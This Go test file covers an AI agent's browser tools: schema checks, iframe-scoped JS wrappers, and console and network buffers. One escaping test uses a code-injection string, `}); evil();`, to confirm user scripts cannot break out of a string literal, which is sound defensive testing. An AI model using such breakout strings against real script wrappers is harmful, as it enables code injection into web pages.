		m, ok := alt.(map[string]any)
		if !ok {
			t.Fatalf("browser_select: anyOf entry is not a map: %T", alt)
		}
		req, _ := m["required"].([]string)
		for _, r := range req {
			want[r] = true
		}
	}
	for field, found := range want {
		if !found {
			t.Errorf("browser_select: anyOf missing alternative for %q", field)
		}
	}
}

func TestBrowserSelectTool_RejectsNoValueNoTextNoValues(t *testing.T) {
	tool := findBrowserTool(t, "browser_select")
	res := tool.Run(map[string]any{"selector": "#sel"})
	if res.GetError() == nil {
		t.Fatal("expected error when neither value, text, nor values is given")
	}
	if !strings.Contains(res.GetError().Error(), "provide") {
		t.Errorf("unexpected error: %v", res.GetError())
	}
}

// ── browser_scroll frame propagation (item 12) ───────────────────────────────

func TestBrowserScroll_WindowScriptUsesFrameWindow(t *testing.T) {
	// No live browser needed — verify the generated JS references doc.defaultView
	// when a frame selector is present. We test the helper logic by inspecting
	// what selectDocScopeJS produces and that our scroll script includes it.
	frame := "#payment-iframe"
	scope := selectDocScopeJS(frame)

	toBottomScript := fmt.Sprintf(`(function(){%s doc.defaultView.scrollTo(0, doc.body.scrollHeight)})()`, scope)
	if !strings.Contains(toBottomScript, "contentDocument") {
		t.Errorf("to_bottom frame script should query iframe contentDocument, got: %s", toBottomScript)
	}
	if !strings.Contains(toBottomScript, "defaultView") {
		t.Errorf("to_bottom frame script should use doc.defaultView, got: %s", toBottomScript)
	}

	scrollByScript := fmt.Sprintf(`(function(){%s doc.defaultView.scrollBy(%d, %d)})()`, scope, 0, 500)
	if !strings.Contains(scrollByScript, "contentDocument") {
		t.Errorf("scrollBy frame script should query iframe contentDocument, got: %s", scrollByScript)
	}
	if !strings.Contains(scrollByScript, "defaultView") {
		t.Errorf("scrollBy frame script should use doc.defaultView, got: %s", scrollByScript)
	}
}

func TestBrowserScrollTool_FramePropertyDocumented(t *testing.T) {
	tool := findBrowserTool(t, "browser_scroll")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	for _, field := range []string{"x", "y", "to_bottom"} {
		prop, ok := props[field].(map[string]any)
		if !ok {
			t.Fatalf("browser_scroll: missing %q property", field)
		}
		desc, _ := prop["description"].(string)
		if !strings.Contains(strings.ToLower(desc), "frame") {
			t.Errorf("browser_scroll: %q description should mention frame, got: %q", field, desc)
		}
	}
}

// ── browser_wait timeout_ms bounds (item 13) ─────────────────────────────────

func TestBrowserWaitTool_TimeoutMsBounds(t *testing.T) {
	tool := findBrowserTool(t, "browser_wait")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	toProp, ok := props["timeout_ms"].(map[string]any)
	if !ok {
		t.Fatal("browser_wait: schema missing 'timeout_ms' property")
	}
	if toProp["type"] != "integer" {
		t.Errorf("browser_wait: timeout_ms should be integer, got %v", toProp["type"])
	}
	if minTimeOut, _ := toProp["minimum"].(int); minTimeOut != 100 {
		t.Errorf("browser_wait: timeout_ms minimum should be 100, got %v", toProp["minimum"])
	}
	if maxTimeOut, _ := toProp["maximum"].(int); maxTimeOut != 120000 {
		t.Errorf("browser_wait: timeout_ms maximum should be 120000, got %v", toProp["maximum"])
	}
}

// ── selectDocScopeJS ─────────────────────────────────────────────────────────

func TestSelectDocScopeJS_EmptyFrameReturnsTopDoc(t *testing.T) {
	js := selectDocScopeJS("")
	if !strings.Contains(js, "var doc = document") {
		t.Errorf("expected top-frame document fallback, got: %s", js)
	}
	// Must NOT call querySelector for a frame in this branch.
	if strings.Contains(js, "querySelector") {
		t.Errorf("empty frameSelector should not emit a querySelector call: %s", js)
	}
}

func TestSelectDocScopeJS_FrameQueriesContentDocument(t *testing.T) {
	js := selectDocScopeJS("#payment-iframe")
	checks := []string{
		`document.querySelector("#payment-iframe")`,
		"contentDocument",
		"var doc =",
		"error: frame became inaccessible",
	}
	for _, want := range checks {
		if !strings.Contains(js, want) {
			t.Errorf("expected %q in:\n%s", want, js)
		}
	}
}

func TestSelectDocScopeJS_FrameSelectorIsEscaped(t *testing.T) {
	// %q escapes embedded quotes so the JS string literal stays valid.
	// A frame selector with " or \ must not break out of the string.
	got := selectDocScopeJS(`iframe[name="quoted"]`)
	if strings.Contains(got, `iframe[name="quoted"]`) {
		t.Errorf("expected %%q escaping; raw quotes leaked into JS:\n%s", got)
	}
	// Still must reference the (escaped) selector twice — once in
	// querySelector, once in the error message — so a frame disappearing
	// at runtime is reported with the offending selector.
	if strings.Count(got, "quoted") != 2 {
		t.Errorf("expected two references to the frame selector, got:\n%s", got)
	}
}

// ── buildEvalExpression ──────────────────────────────────────────────────────

func TestBuildEvalExpression_NoFrameWrapsInAsyncIIFE(t *testing.T) {
	got := buildEvalExpression("", "return 1+1;")
	want := "(async function(){\nreturn 1+1;\n})()"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestBuildEvalExpression_FrameAddsIframeWrapper(t *testing.T) {
	got := buildEvalExpression("#payment", "return document.title;")
	checks := []string{
		`document.querySelector("#payment")`,
		"contentWindow",
		"contentDocument",
		"new __win.Function",
		"frame not found",
		"frame is cross-origin",
		"frame has no accessible document",
		"return await __fn.call",
	}
	for _, want := range checks {
		if !strings.Contains(got, want) {
			t.Errorf("expected %q in expression, got:\n%s", want, got)
		}
	}
}

func TestBuildEvalExpression_FrameUserScriptIsEscapedAsString(t *testing.T) {
	// User scripts can contain "any" content. They must end up as a JS
	// string literal (the third arg to `new Function`) — never spliced as
	// raw code. A script with an unmatched closing brace would break the
	// outer wrapper if interpolated raw.
	got := buildEvalExpression("#f", `return "}); evil();";`)
	// The user's script must appear inside a JS string literal — no
	// unescaped quotes from the script bleed into the surrounding code.
	if !strings.Contains(got, `\"}); evil();\"`) {
		t.Errorf("expected user-script quotes to be escaped, got:\n%s", got)
	}
}

func TestBuildEvalExpression_FrameSelectorAppearsInErrorMessages(t *testing.T) {
	// A misbehaving frame selector should surface in the runtime error so
	// the LLM can retry with a corrected one. Verify we mention it 4 times
	// (once in querySelector, three times across the different error
	// messages).
	got := buildEvalExpression("iframe[name=stripe]", "return 1;")
	count := strings.Count(got, "iframe[name=stripe]")
	if count < 4 {
		t.Errorf("expected frame selector to appear ≥4 times (one querySelector + three error messages), got %d in:\n%s", count, got)
	}
}

// ── consoleBuffer ────────────────────────────────────────────────────────────

func makeEntry(level, text string) consoleEntry {
	return consoleEntry{Level: level, Text: text}
}

func TestConsoleBuffer_AddRespectsCapacity(t *testing.T) {
	b := newConsoleBuffer(3)
	for i := range 5 {
		b.add(makeEntry("log", fmt.Sprintf("msg-%d", i)))
	}
	out := b.read(consoleQuery{})
	if len(out) != 3 {
		t.Fatalf("expected 3 entries (oldest dropped), got %d", len(out))
	}
	// Oldest two ("msg-0", "msg-1") should have been dropped.
	if out[0].Text != "msg-2" || out[2].Text != "msg-4" {
		t.Errorf("unexpected order: %+v", out)
	}
}

func TestConsoleBuffer_FilterByLevel(t *testing.T) {
	b := newConsoleBuffer(10)
	b.add(makeEntry("log", "a"))
	b.add(makeEntry("warn", "b"))
	b.add(makeEntry("error", "c"))
	out := b.read(consoleQuery{level: "warn"})
	if len(out) != 1 || out[0].Text != "b" {
		t.Errorf("expected only 'warn' entry, got %+v", out)
	}
	// "all" returns everything.
	out = b.read(consoleQuery{level: "all"})
	if len(out) != 3 {
		t.Errorf("expected 3 entries with level=all, got %d", len(out))
	}
}

func TestConsoleBuffer_FilterBySubstring(t *testing.T) {
	b := newConsoleBuffer(10)
	b.add(makeEntry("log", "Failed to fetch /api/users"))
	b.add(makeEntry("log", "rendered Header"))
	b.add(makeEntry("log", "Failed to load /api/posts"))
	out := b.read(consoleQuery{substring: "failed"})
	if len(out) != 2 {
		t.Errorf("expected 2 substring matches, got %d: %+v", len(out), out)
	}
}

func TestConsoleBuffer_ClearEmptiesAfterRead(t *testing.T) {
	b := newConsoleBuffer(10)
	b.add(makeEntry("log", "x"))
	b.add(makeEntry("log", "y"))
	out := b.read(consoleQuery{clear: true})
	if len(out) != 2 {
		t.Errorf("first read returned %d, want 2", len(out))
	}
	out = b.read(consoleQuery{})
	if len(out) != 0 {
		t.Errorf("after clear, expected 0 entries; got %d", len(out))
	}
}

func TestConsoleBuffer_ClearTrueWithFilterStillEmptiesEverything(t *testing.T) {
	// `clear` semantically means "consume the whole buffer", even if the
	// caller only asked to see entries matching a level filter. Otherwise
	// callers polling for "give me errors and clear them" would silently
	// leave non-error entries to grow unbounded.
	b := newConsoleBuffer(10)
	b.add(makeEntry("log", "noise"))
	b.add(makeEntry("error", "bug"))
	out := b.read(consoleQuery{level: "error", clear: true})
	if len(out) != 1 || out[0].Text != "bug" {
		t.Errorf("filter should have returned only the error: %+v", out)
	}
	if remaining := b.read(consoleQuery{}); len(remaining) != 0 {
		t.Errorf("clear must empty the entire buffer including filtered-out 'noise', got: %+v", remaining)
	}
}

// ── remoteObjectToString ─────────────────────────────────────────────────────

func TestRemoteObjectToString_NilReturnsEmpty(t *testing.T) {
	if got := remoteObjectToString(nil); got != "" {
		t.Errorf("expected empty string for nil arg, got %q", got)
	}
}

// ── browser_console_log validation ───────────────────────────────────────────

func TestBrowserConsoleLog_RejectsUnknownLevel(t *testing.T) {
	tool := findBrowserTool(t, "browser_console_log")
	res := tool.Run(map[string]any{"level": "fatal"})
	if res.GetError() == nil {
		t.Fatal("expected error for unknown level")
	}
	if !strings.Contains(res.GetError().Error(), "level must be") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserConsoleLog_RejectsZeroLimit(t *testing.T) {
	tool := findBrowserTool(t, "browser_console_log")
	res := tool.Run(map[string]any{"limit": 0})
	if res.GetError() == nil {
		t.Fatal("expected error for limit=0")
	}
	if !strings.Contains(res.GetError().Error(), "limit must be") {
		t.Errorf("got %v", res.GetError())
	}
}

// ── browser_click frame + text combination ───────────────────────────────────

func TestBrowserClick_RejectsTextWithFrame(t *testing.T) {
	tool := findBrowserTool(t, "browser_click")
	res := tool.Run(map[string]any{
		"text":  "Login",
		"frame": "#payment-iframe",
	})
	if res.GetError() == nil {
		t.Fatal("expected error when text + frame combined")
	}
	if !strings.Contains(res.GetError().Error(), "text-based matching cannot be scoped") {
		t.Errorf("got %v", res.GetError())
	}
}

// ── browser_network schema (item 14) ─────────────────────────────────────────

func TestBrowserNetworkTool_Schema(t *testing.T) {
	tool := findBrowserTool(t, "browser_network")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	for _, field := range []string{"action", "url_filter", "method", "status_min", "status_max", "limit", "include_pending"} {
		if _, ok := props[field]; !ok {
			t.Errorf("browser_network: schema missing %q property", field)
		}
	}

	actionProp, _ := props["action"].(map[string]any)
	enum, _ := actionProp["enum"].([]string)
	wantActions := map[string]bool{"get": false, "clear": false}
	for _, a := range enum {
		wantActions[a] = true
	}
	for a, found := range wantActions {
		if !found {
			t.Errorf("browser_network: action enum missing %q", a)
		}
	}

	limitProp, _ := props["limit"].(map[string]any)
	if minTimeOut, _ := limitProp["minimum"].(int); minTimeOut != 1 {
		t.Errorf("browser_network: limit minimum should be 1, got %v", limitProp["minimum"])
	}
	if maxTimeOut, _ := limitProp["maximum"].(int); maxTimeOut != 200 {
		t.Errorf("browser_network: limit maximum should be 200, got %v", limitProp["maximum"])
	}
}

func TestBrowserNetworkTool_RejectsInvalidAction(t *testing.T) {
	tool := findBrowserTool(t, "browser_network")
	res := tool.Run(map[string]any{"action": "watch"})
	if res.GetError() == nil {
		t.Fatal("expected error for invalid action")
	}
	if !strings.Contains(res.GetError().Error(), "action must be") {
		t.Errorf("unexpected error: %v", res.GetError())
	}
}

func TestNetworkBuffer_RingBehaviour(t *testing.T) {
	buf := newNetworkBuffer(3)

	for i := range 5 {
		buf.addLocked(networkEntry{RequestID: fmt.Sprintf("r%d", i), URL: fmt.Sprintf("http://x/%d", i), Done: true})
	}

	got := buf.read(networkQuery{limit: 10})
	if len(got) != 3 {
		t.Fatalf("ring capped at 3, got %d entries", len(got))
	}
	if got[0].RequestID != "r2" {
		t.Errorf("oldest retained should be r2, got %s", got[0].RequestID)
	}
}

func TestNetworkEntryMatches_URLFilter(t *testing.T) {
	e := networkEntry{URL: "https://api.example.com/users", Method: "GET", Status: 200}
	if !networkEntryMatches(e, networkQuery{urlFilter: "example"}) {
		t.Error("should match 'example' substring")
	}
	if networkEntryMatches(e, networkQuery{urlFilter: "other.com"}) {
		t.Error("should not match 'other.com'")
	}
}

func TestNetworkEntryMatches_StatusRange(t *testing.T) {
	e := networkEntry{Status: 404}
	if !networkEntryMatches(e, networkQuery{statusMin: 400, statusMax: 499}) {
		t.Error("404 should be in 400-499 range")
	}
	if networkEntryMatches(e, networkQuery{statusMin: 200, statusMax: 299}) {
		t.Error("404 should not be in 200-299 range")
	}
}

func TestNetworkBuffer_ClearEmptiesCompleted(t *testing.T) {
	buf := newNetworkBuffer(10)
	buf.addLocked(networkEntry{RequestID: "r1", Done: true})
	buf.addLocked(networkEntry{RequestID: "r2", Done: true})

	got := buf.read(networkQuery{clear: true, limit: 100})
	if len(got) != 2 {
		t.Fatalf("expected 2 entries before clear, got %d", len(got))
	}
	after := buf.read(networkQuery{limit: 100})
	if len(after) != 0 {
		t.Errorf("buffer should be empty after clear, got %d entries", len(after))
	}
}

// ── browser_accessibility schema (item 15) ───────────────────────────────────

func TestBrowserAccessibilityTool_Schema(t *testing.T) {
	tool := findBrowserTool(t, "browser_accessibility")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	for _, field := range []string{"selector", "max_depth", "interesting_only"} {
		if _, ok := props[field]; !ok {
			t.Errorf("browser_accessibility: schema missing %q property", field)
		}
	}

	depthProp, _ := props["max_depth"].(map[string]any)
	if minTimeOut, _ := depthProp["minimum"].(int); minTimeOut != 1 {
		t.Errorf("browser_accessibility: max_depth minimum should be 1, got %v", depthProp["minimum"])
	}
	if maxTimeOut, _ := depthProp["maximum"].(int); maxTimeOut != 50 {
		t.Errorf("browser_accessibility: max_depth maximum should be 50, got %v", depthProp["maximum"])
	}
}

func TestAxValueStr_NilReturnsEmpty(t *testing.T) {
	if got := axValueStr(nil); got != "" {
		t.Errorf("axValueStr(nil) = %q, want empty", got)
	}
}

func TestAxValueStr_UnmarshalsString(t *testing.T) {
	v := &cdpaccessibility.Value{Value: []byte(`"Submit"`)}
	if got := axValueStr(v); got != "Submit" {
		t.Errorf("axValueStr = %q, want %q", got, "Submit")
	}
}

func TestAxValueStr_FallsBackToRawBytes(t *testing.T) {
	v := &cdpaccessibility.Value{Value: []byte(`true`)}
	if got := axValueStr(v); got != "true" {
		t.Errorf("axValueStr = %q, want %q", got, "true")
	}
}

func TestAxValueStr_NullReturnsEmpty(t *testing.T) {
	v := &cdpaccessibility.Value{Value: []byte(`null`)}
	if got := axValueStr(v); got != "" {
		t.Errorf("axValueStr(null) = %q, want empty", got)
	}
}

func TestIsUninterestingAXRole_FiltersNoiseRoles(t *testing.T) {
	cases := []struct {
		role, name string
		want       bool
	}{
		{"none", "", true},
		{"generic", "", true},
		{"presentation", "", true},
		{"InlineTextBox", "", true},
		{"", "", true},
		{"none", "Submit", false},   // has name → interesting
		{"button", "", false},       // interactive role → keep
		{"heading", "Title", false}, // named → keep
	}
	for _, c := range cases {
		got := isUninterestingAXRole(c.role, c.name)
		if got != c.want {
			t.Errorf("isUninterestingAXRole(%q, %q) = %v, want %v", c.role, c.name, got, c.want)
		}
	}
}

func TestBuildAXTree_FullTreeFindsRootsByEmptyParent(t *testing.T) {
	mkVal := func(s string) *cdpaccessibility.Value {
		return &cdpaccessibility.Value{Value: []byte(`"` + s + `"`)}
	}
	nodes := []*cdpaccessibility.Node{
		{NodeID: "1", ParentID: "", Role: mkVal("WebArea"), ChildIDs: []cdpaccessibility.NodeID{"2"}},
		{NodeID: "2", ParentID: "1", Role: mkVal("button"), Name: mkVal("OK")},
	}
	tree := buildAXTree(nodes, "", false, 10)
	if len(tree) != 1 {
		t.Fatalf("expected 1 root, got %d", len(tree))
	}
	if tree[0].Role != "WebArea" {
		t.Errorf("root role = %q, want WebArea", tree[0].Role)
	}
	if len(tree[0].Children) != 1 || tree[0].Children[0].Name != "OK" {
		t.Errorf("child not found or wrong name: %+v", tree[0].Children)
	}
}

func TestBuildAXTree_InterestingOnlySkipsGeneric(t *testing.T) {
	mkVal := func(s string) *cdpaccessibility.Value {
		return &cdpaccessibility.Value{Value: []byte(`"` + s + `"`)}
	}
	nodes := []*cdpaccessibility.Node{
		{NodeID: "1", ParentID: "", Role: mkVal("WebArea"), ChildIDs: []cdpaccessibility.NodeID{"2"}},
		{NodeID: "2", ParentID: "1", Role: mkVal("generic"), ChildIDs: []cdpaccessibility.NodeID{"3"}},
		{NodeID: "3", ParentID: "2", Role: mkVal("button"), Name: mkVal("Submit")},
	}
	tree := buildAXTree(nodes, "", true, 10)
	// The generic node should be skipped; the button should be promoted.
	if len(tree) != 1 {
		t.Fatalf("expected 1 root, got %d", len(tree))
	}
	root := tree[0]
	if root.Role != "WebArea" {
		t.Fatalf("root should be WebArea, got %q", root.Role)
	}
	if len(root.Children) != 1 || root.Children[0].Role != "button" {
		t.Errorf("button not promoted through generic: %+v", root.Children)
	}
}

// ── console listener cleanup ─────────────────────────────────────────────────

// TestBrowserPool_ConsoleListenerTokenIdentity verifies that consoleCncl is
// a pointer type so two separately created tokens are always distinct even if
// they wrap the same underlying cancel func value.
func TestBrowserPool_ConsoleListenerTokenIdentity(t *testing.T) {
	noop := func() {}
	a := &consoleListenerToken{cancel: noop}
	b := &consoleListenerToken{cancel: noop}
	if a == b {
		t.Fatal("distinct tokens must not be pointer-equal")
	}
}

// TestBrowserPool_AttachConsoleCaptureReplacesToken verifies that the pool
// field is updated on the second call; this guards against regressions where
// consoleCncl is left pointing at a stale token.
func TestBrowserPool_AttachConsoleCaptureReplacesToken(t *testing.T) {
	// newBrowserPool wires up the struct without opening any real browser.
	pool := newBrowserPool(nil, 0)
	tok1 := &consoleListenerToken{cancel: func() {}}
	tok2 := &consoleListenerToken{cancel: func() {}}

	pool.consoleMu.Lock()
	pool.consoleCncl = tok1
	pool.consoleMu.Unlock()

	// Simulate the swap that attachConsoleCapture does.
	pool.consoleMu.Lock()
	if pool.consoleCncl != nil {
		pool.consoleCncl.cancel()
	}
	pool.consoleCncl = tok2
	pool.consoleMu.Unlock()

	pool.consoleMu.Lock()
	got := pool.consoleCncl
	pool.consoleMu.Unlock()

	if got != tok2 {
		t.Fatalf("consoleCncl should be tok2 after swap, got %p (tok1=%p tok2=%p)", got, tok1, tok2)
	}
}

// ── Schema regression guards ─────────────────────────────────────────────────
//
// The schema-regression guard previously lived here, scoped to browser tools
// only. It has been promoted to schemas_test.go where it covers every tool
// collection (native + memory + email) via a shared helper. Browser tools
// flow through that test as part of NewNativeTools.
